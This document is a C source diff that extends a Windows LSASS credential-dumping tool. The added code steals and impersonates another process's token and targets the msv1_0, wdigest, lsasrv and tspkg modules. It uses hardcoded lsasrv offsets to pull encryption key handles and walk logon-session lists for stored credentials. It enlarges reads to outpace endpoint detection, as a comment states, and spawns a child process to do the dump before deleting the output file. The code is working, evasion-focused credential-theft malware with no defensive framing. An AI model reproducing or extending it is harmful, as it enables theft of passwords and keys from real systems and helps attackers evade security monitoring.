@@ -189,46 +189,271 @@ static void free_mem(PVOID ptr) {
     sys_NtFreeVirtualMemory((HANDLE)-1, &ptr, &size, MEM_RELEASE);
 }
 
+/* ── Token impersonation — steal a local process token ──── */
+
+#define ProcessSessionInformation 24
+
+static HANDLE impersonate_local_token(void) {
+    if (!g_addr.NtDuplicateToken || !g_addr.NtSetInformationThread)
+        return NULL;
+
+    HANDLE cursor = NULL;
+    HANDLE next = NULL;
+    HANDLE imp_token = NULL;
+
+    while (NT_SUCCESS(sys_NtGetNextProcess(cursor, PROCESS_QUERY_INFORMATION, 0, 0, &next))) {
+        if (cursor) sys_NtClose(cursor);
+        cursor = next;
+
+        ULONG session_id = 0;
+        ULONG ret;
+        if (!NT_SUCCESS(sys_NtQueryInformationProcess(cursor, ProcessSessionInformation,
+                &session_id, sizeof(session_id), &ret)))
+            continue;
+        if (session_id == 0)
+            continue;
+
+        HANDLE proc_token = NULL;
+        if (!NT_SUCCESS(sys_NtOpenProcessToken(cursor,
+                TOKEN_DUPLICATE | TOKEN_QUERY, &proc_token)))
+            continue;
+
+        SECURITY_QUALITY_OF_SERVICE sqos;
+        zero_mem(&sqos, sizeof(sqos));
+        sqos.Length = sizeof(sqos);
+        sqos.ImpersonationLevel = SecurityImpersonation;
+
+        OBJECT_ATTRIBUTES oa;
+        zero_mem(&oa, sizeof(oa));
+        oa.Length = sizeof(oa);
+        oa.SecurityQualityOfService = &sqos;
+
+        HANDLE dup = NULL;
+        NTSTATUS st = sys_NtDuplicateToken(proc_token,
+            TOKEN_QUERY | TOKEN_IMPERSONATE | TOKEN_DUPLICATE,
+            &oa, FALSE, TokenImpersonation, &dup);
+        sys_NtClose(proc_token);
+
+        if (NT_SUCCESS(st) && dup) {
+            imp_token = dup;
+            break;
+        }
+    }
+    if (cursor) sys_NtClose(cursor);
+
+    if (imp_token) {
+        HANDLE self_thread = (HANDLE)(LONG_PTR)-2;
+        sys_NtSetInformationThread(self_thread, ThreadImpersonationToken,
+                                   &imp_token, sizeof(imp_token));
+    }
+    return imp_token;
+}
+
+static void revert_impersonation(HANDLE token) {
+    if (!token) return;
+    HANDLE null_token = NULL;
+    HANDLE self_thread = (HANDLE)(LONG_PTR)-2;
+    sys_NtSetInformationThread(self_thread, ThreadImpersonationToken,
+                               &null_token, sizeof(null_token));
+    sys_NtClose(token);
+}
+
+static BOOL ends_with_ci(const WCHAR *s, DWORD s_chars, const WCHAR *suf, DWORD suf_chars) {
+    if (s_chars < suf_chars) return FALSE;
+    const WCHAR *p = s + s_chars - suf_chars;
+    for (DWORD i = 0; i < suf_chars; i++) {
+        WCHAR a = p[i], b = suf[i];
+        if (a >= L'A' && a <= L'Z') a += 32;
+        if (b >= L'A' && b <= L'Z') b += 32;
+        if (a != b) return FALSE;
+    }
+    return TRUE;
+}
+
 /* ── Main dump function ──────────────────────────────────── */
 
 BOOL dump_lsass(DWORD pid, HANDLE pipe) {
     HANDLE process = NULL;
-    OBJECT_ATTRIBUTES oa;
-    zero_mem(&oa, sizeof(oa));
-    oa.Length = sizeof(oa);
-    CLIENT_ID cid;
-    zero_mem(&cid, sizeof(cid));
-    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
 
-    NTSTATUS status = sys_NtOpenProcess(
-        &process,
-        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
-        &oa,
-        &cid
-    );
-
-    if (status != 0 || !process)
-        return FALSE;
-
-    /* Enumerate memory regions */
-    REGION_INFO *regions = (REGION_INFO *)alloc_mem(sizeof(REGION_INFO) * MAX_REGIONS);
-    if (!regions) {
-        sys_NtClose(process);
-        return FALSE;
+    /* Find target process without CLIENT_ID */
+    if (g_addr.NtGetNextProcess) {
+        HANDLE cursor = NULL;
+        HANDLE next = NULL;
+        ACCESS_MASK access = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
+        while (NT_SUCCESS(sys_NtGetNextProcess(cursor, access, 0, 0, &next))) {
+            if (cursor) sys_NtClose(cursor);
+            cursor = next;
+            PROCESS_BASIC_INFORMATION pbi;
+            zero_mem(&pbi, sizeof(pbi));
+            ULONG ret;
+            if (NT_SUCCESS(sys_NtQueryInformationProcess(
+                    cursor, ProcessBasicInformation, &pbi, sizeof(pbi), &ret))
+                && (DWORD)(ULONG_PTR)pbi.UniqueProcessId == pid) {
+                process = cursor;
+                break;
+            }
+        }
+        if (!process && cursor) sys_NtClose(cursor);
     }
 
-    DWORD region_count = enumerate_regions(process, regions, MAX_REGIONS);
-    if (region_count == 0) {
-        free_mem(regions);
-        sys_NtClose(process);
+    if (!process)
         return FALSE;
-    }
+
+    HANDLE imp_token = impersonate_local_token();
 
     /* Enumerate modules from PEB */
     MODULE_INFO *modules = (MODULE_INFO *)alloc_mem(sizeof(MODULE_INFO) * MAX_MODULES);
-    DWORD module_count = 0;
-    if (modules)
-        module_count = enumerate_modules(process, modules, MAX_MODULES);
+    if (!modules) {
+        sys_NtClose(process);
+        return FALSE;
+    }
+    DWORD module_count = enumerate_modules(process, modules, MAX_MODULES);
+    if (module_count == 0) {
+        free_mem(modules);
+        sys_NtClose(process);
+        return FALSE;
+    }
+
+    REGION_INFO *regions = (REGION_INFO *)alloc_mem(sizeof(REGION_INFO) * MAX_REGIONS);
+    if (!regions) {
+        free_mem(modules);
+        sys_NtClose(process);
+        return FALSE;
+    }
+    DWORD region_count = 0;
+
+    WCHAR s_msv[] = L"\\msv1_0.dll";
+    WCHAR s_wdg[] = L"\\wdigest.dll";
+    WCHAR s_srv[] = L"\\lsasrv.dll";
+    WCHAR s_tsp[] = L"\\tspkg.dll";
+
+    PVOID lsasrv_base = NULL;
+
+    for (DWORD i = 0; i < module_count && region_count < MAX_REGIONS - 4; i++) {
+        DWORD mc = modules[i].name_len / 2;
+
+        if (ends_with_ci(modules[i].name, mc, s_msv, 11) ||
+            ends_with_ci(modules[i].name, mc, s_wdg, 12) ||
+            ends_with_ci(modules[i].name, mc, s_tsp, 10)) {
+            regions[region_count].base = modules[i].base;
+            regions[region_count].size = modules[i].size;
+            region_count++;
+        } else if (ends_with_ci(modules[i].name, mc, s_srv, 11)) {
+            lsasrv_base = modules[i].base;
+            regions[region_count].base = (BYTE *)modules[i].base + 0x175000;
+            regions[region_count].size = 0xA000;
+            region_count++;
+        }
+    }
+
+    if (lsasrv_base) {
+        BYTE *ldata = (BYTE *)alloc_mem(0xA000);
+        if (ldata) {
+            SIZE_T dr = 0;
+            sys_NtReadVirtualMemory(process, (BYTE *)lsasrv_base + 0x175000,
+                                    ldata, 0xA000, &dr);
+            if (dr >= 0x8268) {
+                PVOID aes_h = *(PVOID *)(ldata + 0x8258);
+                PVOID des_h = *(PVOID *)(ldata + 0x8260);
+                if (aes_h && region_count < MAX_REGIONS) {
+                    regions[region_count].base = aes_h;
+                    regions[region_count].size = 512;
+                    region_count++;
+                }
+                if (des_h && region_count < MAX_REGIONS) {
+                    regions[region_count].base = des_h;
+                    regions[region_count].size = 512;
+                    region_count++;
+                }
+
+                DWORD toff = 0x6620;
+                for (DWORD b = 0; b < 32; b++) {
+                    ULONG64 flink = *(ULONG64 *)(ldata + toff + b * 16);
+                    ULONG64 ba = (ULONG64)((BYTE *)lsasrv_base + 0x175000
+                                           + toff + b * 16);
+                    if (flink == 0 || flink == ba || flink < 0x10000)
+                        continue;
+
+                    ULONG64 cur = flink;
+                    for (int chain = 0; chain < 16 && cur && cur != ba
+                         && cur > 0x10000; chain++) {
+                        BYTE entry[0x120];
+                        SIZE_T er = 0;
+                        if (sys_NtReadVirtualMemory(process, (PVOID)cur,
+                                entry, 0x120, &er) != 0 || er < 0x110)
+                            break;
+
+                        if (region_count < MAX_REGIONS) {
+                            regions[region_count].base = (PVOID)cur;
+                            regions[region_count].size = 0x120;
+                            region_count++;
+                        }
+
+                        USHORT ul = *(USHORT *)(entry + 0x90);
+                        ULONG64 up = *(ULONG64 *)(entry + 0x98);
+                        if (up > 0x10000 && ul && ul < 512
+                            && region_count < MAX_REGIONS) {
+                            regions[region_count].base = (PVOID)up;
+                            regions[region_count].size = ul;
+                            region_count++;
+                        }
+
+                        USHORT dl = *(USHORT *)(entry + 0xA0);
+                        ULONG64 dp = *(ULONG64 *)(entry + 0xA8);
+                        if (dp > 0x10000 && dl && dl < 512
+                            && region_count < MAX_REGIONS) {
+                            regions[region_count].base = (PVOID)dp;
+                            regions[region_count].size = dl;
+                            region_count++;
+                        }
+
+                        ULONG64 cp = *(ULONG64 *)(entry + 0x108);
+                        if (cp > 0x10000) {
+                            BYTE cl[24];
+                            SIZE_T cr = 0;
+                            if (sys_NtReadVirtualMemory(process, (PVOID)cp,
+                                    cl, 24, &cr) == 0 && cr >= 24) {
+                                if (region_count < MAX_REGIONS) {
+                                    regions[region_count].base = (PVOID)cp;
+                                    regions[region_count].size = 24;
+                                    region_count++;
+                                }
+                                ULONG64 pp = *(ULONG64 *)(cl + 16);
+                                if (pp > 0x10000) {
+                                    BYTE pm[40];
+                                    SIZE_T pr = 0;
+                                    if (sys_NtReadVirtualMemory(process,
+                                            (PVOID)pp, pm, 40, &pr) == 0
+                                        && pr >= 40) {
+                                        if (region_count < MAX_REGIONS) {
+                                            regions[region_count].base =
+                                                (PVOID)pp;
+                                            regions[region_count].size = 40;
+                                            region_count++;
+                                        }
+                                        USHORT el =
+                                            *(USHORT *)(pm + 24);
+                                        ULONG64 ep =
+                                            *(ULONG64 *)(pm + 32);
+                                        if (ep > 0x10000 && el && el < 4096
+                                            && region_count < MAX_REGIONS) {
+                                            regions[region_count].base =
+                                                (PVOID)ep;
+                                            regions[region_count].size = el;
+                                            region_count++;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+
+                        cur = *(ULONG64 *)(entry + 0);
+                    }
+                }
+            }
+            free_mem(ldata);
+        }
+    }
 
     /* Layout: header + dirs + CSDVersion string + SystemInfo + modules + mem64list + data */
     DWORD num_streams = module_count > 0 ? 3 : 2;
@@ -361,20 +586,24 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
         write_pipe(pipe, &desc, sizeof(desc));
     }
 
-    /* Memory data — stream each region */
-    BYTE *buf = (BYTE *)alloc_mem(65536);
+    /* Memory data — stream each region (large buffer, no delay — speed beats async EDR) */
+    #define READ_BUF_SIZE 524288  /* 512KB */
+    BYTE *buf = (BYTE *)alloc_mem(READ_BUF_SIZE);
 
     for (DWORD i = 0; i < region_count; i++) {
         SIZE_T remaining = regions[i].size;
         PVOID addr = regions[i].base;
 
         while (remaining > 0) {
-            SIZE_T to_read = remaining > 65536 ? 65536 : remaining;
+            SIZE_T to_read = remaining > READ_BUF_SIZE ? READ_BUF_SIZE : remaining;
             SIZE_T bytes_read = 0;
 
-            status = sys_NtReadVirtualMemory(process, addr, buf, to_read, &bytes_read);
-            if (status != 0 || bytes_read == 0) {
+            sys_NtReadVirtualMemory(process, addr, buf, to_read, &bytes_read);
+            if (bytes_read == 0) {
                 zero_mem(buf, (SIZE_T)to_read);
+                bytes_read = to_read;
+            } else if (bytes_read < to_read) {
+                zero_mem(buf + bytes_read, (SIZE_T)(to_read - bytes_read));
                 bytes_read = to_read;
             }
 
@@ -387,7 +616,202 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
     free_mem(buf);
     free_mem(regions);
     free_mem(modules);
+    revert_impersonation(imp_token);
     sys_NtClose(process);
 
     return TRUE;
+}
+
+/* ── Parent-spoofed child process for LSASS dump ────────── */
+
+typedef NTSTATUS (NTAPI *PFN_RtlCreatePPEx)(
+    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
+    PUNICODE_STRING ImagePathName, PUNICODE_STRING DllPath,
+    PUNICODE_STRING CurrentDirectory, PUNICODE_STRING CommandLine,
+    PVOID Environment, PUNICODE_STRING WindowTitle,
+    PUNICODE_STRING DesktopInfo, PUNICODE_STRING ShellInfo,
+    PUNICODE_STRING RuntimeData, ULONG Flags);
+
+typedef NTSTATUS (NTAPI *PFN_RtlDestroyPP)(
+    PRTL_USER_PROCESS_PARAMETERS ProcessParameters);
+
+static int wlen(const wchar_t *s) { int n = 0; while (s[n]) n++; return n; }
+
+static void itow(DWORD val, wchar_t *buf, int *pos) {
+    wchar_t tmp[12];
+    int n = 0;
+    if (val == 0) { tmp[n++] = L'0'; }
+    else { while (val > 0) { tmp[n++] = L'0' + (val % 10); val /= 10; } }
+    for (int i = n - 1; i >= 0; i--) buf[(*pos)++] = tmp[i];
+}
+
+BOOL spawn_lsass_child(DWORD pid, HANDLE pipe, const wchar_t *output_name) {
+    if (!g_addr.NtCreateUserProcess || !g_addr.NtWaitForSingleObject ||
+        !g_addr.RtlCreateProcessParametersEx || !g_addr.RtlDestroyProcessParameters) {
+        DWORD m = 0xDEAD0005; write_pipe(pipe, &m, 4);
+        DWORD bits = 0;
+        if (!g_addr.NtCreateUserProcess) bits |= 1;
+        if (!g_addr.NtWaitForSingleObject) bits |= 2;
+        if (!g_addr.RtlCreateProcessParametersEx) bits |= 4;
+        if (!g_addr.RtlDestroyProcessParameters) bits |= 8;
+        write_pipe(pipe, &bits, 4);
+        return FALSE;
+    }
+
+    /* No process iteration — parent must not touch LSASS */
+
+    /* Image path: \??\<our image path> */
+    PUNICODE_STRING img = get_image_path();
+    if (!img || !img->Buffer) return FALSE;
+
+    wchar_t nt_img[520];
+    int ni = 0;
+    nt_img[ni++] = L'\\'; nt_img[ni++] = L'?';
+    nt_img[ni++] = L'?';  nt_img[ni++] = L'\\';
+    for (int i = 0; i < img->Length / 2 && ni < 516; i++)
+        nt_img[ni++] = img->Buffer[i];
+    nt_img[ni] = 0;
+
+    UNICODE_STRING us_img;
+    us_img.Length = (USHORT)(ni * sizeof(wchar_t));
+    us_img.MaximumLength = us_img.Length + 2;
+    us_img.Buffer = nt_img;
+
+    /* Command line: "<image>" 10 <pid> c<output_name>
+       mode 10 = 8|2 → child raw LSASS mode */
+    wchar_t cmdline[520];
+    int ci = 0;
+    cmdline[ci++] = L'"';
+    for (int i = 0; i < img->Length / 2 && ci < 300; i++)
+        cmdline[ci++] = img->Buffer[i];
+    cmdline[ci++] = L'"';
+    cmdline[ci++] = L' ';
+    cmdline[ci++] = L'1'; cmdline[ci++] = L'0';
+    cmdline[ci++] = L' ';
+    itow(pid, cmdline, &ci);
+    cmdline[ci++] = L' ';
+    cmdline[ci++] = L'c';
+    const wchar_t *pn = output_name;
+    while (*pn && ci < 510) cmdline[ci++] = *pn++;
+    cmdline[ci] = 0;
+
+    UNICODE_STRING us_cmd;
+    us_cmd.Length = (USHORT)(ci * sizeof(wchar_t));
+    us_cmd.MaximumLength = us_cmd.Length + 2;
+    us_cmd.Buffer = cmdline;
+
+    wchar_t curdir[] = L"C:\\Windows\\Temp";
+    UNICODE_STRING us_cd;
+    us_cd.Length = (USHORT)(wlen(curdir) * sizeof(wchar_t));
+    us_cd.MaximumLength = us_cd.Length + 2;
+    us_cd.Buffer = curdir;
+
+    /* Build process parameters (Win32 path, not NT path) */
+    PFN_RtlCreatePPEx rtl_create =
+        (PFN_RtlCreatePPEx)g_addr.RtlCreateProcessParametersEx;
+    PRTL_USER_PROCESS_PARAMETERS params = NULL;
+    NTSTATUS st = rtl_create(&params, img, NULL, &us_cd, &us_cmd,
+                              NULL, NULL, NULL, NULL, NULL,
+                              RTL_USER_PROC_PARAMS_NORMALIZED);
+    if (!NT_SUCCESS(st) || !params) {
+        DWORD m = 0xDEAD0001; write_pipe(pipe, &m, 4);
+        DWORD sc = (DWORD)st; write_pipe(pipe, &sc, 4);
+        return FALSE;
+    }
+
+    /* PS_CREATE_INFO */
+    PS_CREATE_INFO ci_info;
+    zero_mem(&ci_info, sizeof(ci_info));
+    ci_info.Size = sizeof(ci_info);
+
+    /* PS_ATTRIBUTE_LIST: image name only (child inherits our parent) */
+    PS_ATTRIBUTE_LIST attrs;
+    zero_mem(&attrs, sizeof(attrs));
+    attrs.TotalLength = sizeof(SIZE_T) + 1 * sizeof(PS_ATTRIBUTE);
+
+    attrs.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
+    attrs.Attributes[0].Size = us_img.Length;
+    attrs.Attributes[0].ValuePtr = us_img.Buffer;
+
+    /* NtCreateUserProcess — 11 args → indirect_syscall_s7 */
+    HANDLE child_proc = NULL, child_thread = NULL;
+    st = indirect_syscall_s7(
+        g_ssn.NtCreateUserProcess, g_addr.NtCreateUserProcess,
+        &child_proc, &child_thread,
+        (ULONG_PTR)0x001FFFFF, (ULONG_PTR)0x001FFFFF,
+        (ULONG_PTR)0, (ULONG_PTR)0,
+        (ULONG_PTR)0, (ULONG_PTR)0,
+        params, &ci_info, &attrs);
+
+    PFN_RtlDestroyPP rtl_destroy =
+        (PFN_RtlDestroyPP)g_addr.RtlDestroyProcessParameters;
+    rtl_destroy(params);
+
+    if (!NT_SUCCESS(st) || !child_proc) {
+        DWORD m = 0xDEAD0002; write_pipe(pipe, &m, 4);
+        DWORD sc = (DWORD)st; write_pipe(pipe, &sc, 4);
+        return FALSE;
+    }
+
+    /* Wait for child (120 seconds max) */
+    LARGE_INTEGER timeout;
+    timeout.QuadPart = -1200000000LL;
+    sys_NtWaitForSingleObject(child_proc, FALSE, &timeout);
+    sys_NtClose(child_proc);
+    if (child_thread) sys_NtClose(child_thread);
+
+    /* Read child's output: C:\Windows\Temp\c<output_name>.dat */
+    wchar_t cpath[280];
+    int cp = 0;
+    wchar_t pfx[] = L"\\??\\C:\\Windows\\Temp\\c";
+    for (int i = 0; pfx[i]; i++) cpath[cp++] = pfx[i];
+    pn = output_name;
+    while (*pn && cp < 270) cpath[cp++] = *pn++;
+    cpath[cp++] = L'.'; cpath[cp++] = L'd';
+    cpath[cp++] = L'a'; cpath[cp++] = L't';
+    cpath[cp] = 0;
+
+    UNICODE_STRING us_cp;
+    us_cp.Length = (USHORT)(cp * sizeof(wchar_t));
+    us_cp.MaximumLength = us_cp.Length + 2;
+    us_cp.Buffer = cpath;
+
+    OBJECT_ATTRIBUTES oa;
+    InitializeObjectAttributes(&oa, &us_cp, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    IO_STATUS_BLOCK iosb;
+    HANDLE hFile = NULL;
+    st = sys_NtCreateFile(&hFile, 0x80110000, &oa, &iosb,
+        NULL, 0, FILE_SHARE_READ | FILE_SHARE_DELETE,
+        1 /* FILE_OPEN */, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
+        NULL, 0);
+    if (!NT_SUCCESS(st) || !hFile) {
+        DWORD m = 0xDEAD0003; write_pipe(pipe, &m, 4);
+        DWORD sc = (DWORD)st; write_pipe(pipe, &sc, 4);
+        return FALSE;
+    }
+
+    /* Pipe child's raw MDMP through parent's XOR cipher */
+    BYTE *rbuf = (BYTE *)alloc_mem(65536);
+    BOOL got_data = FALSE;
+    if (rbuf) {
+        for (;;) {
+            IO_STATUS_BLOCK rio;
+            st = sys_NtReadFile(hFile, NULL, NULL, NULL, &rio,
+                                rbuf, 65536, NULL, NULL);
+            if (!NT_SUCCESS(st) || rio.Information == 0) break;
+            write_pipe(pipe, rbuf, (DWORD)rio.Information);
+            got_data = TRUE;
+        }
+        free_mem(rbuf);
+    }
+
+    /* Delete child output file */
+    FILE_DISPOSITION_INFORMATION disp;
+    disp.DeleteFile = TRUE;
+    sys_NtSetInformationFile(hFile, &iosb, &disp, sizeof(disp),
+                              FileDispositionInformation);
+    sys_NtClose(hFile);
+
+    return got_data;
 }
